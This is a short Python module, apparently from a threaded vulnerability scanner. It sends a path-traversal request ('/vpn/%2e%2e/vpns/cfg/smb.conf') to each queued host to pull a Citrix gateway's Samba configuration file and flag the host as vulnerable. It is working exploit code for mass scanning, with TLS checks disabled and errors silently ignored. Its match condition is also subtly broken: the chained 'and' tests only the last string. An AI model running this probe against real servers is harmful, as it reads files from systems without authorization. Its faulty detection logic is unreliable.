import requests
import threading
import urllib3
from termcolor import cprint

class Detect(threading.Thread):
    def __init__(self, alive_Web_queue, vul_list):
        threading.Thread.__init__(self)
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        self.alive_Web_queue = alive_Web_queue
        self.vul_list = vul_list

    def run(self):
        while not self.alive_Web_queue.empty():
            alive_web = self.alive_Web_queue.get()
            self.run_detect(alive_web)

    def run_detect(self, url):
        try:
            r = requests.get("https://" + url + "/vpn/%2e%2e/vpns/cfg/smb.conf", timeout=10, verify=False)
            if ("[global]") and ("encrypt passwords") and ("name resolve order") in str(r.content):
                cprint('[Citrix] {}'.format(url), 'red')
                self.vul_list.append(['Citrix', url, 'Yes'])
        except Exception as e:
            pass
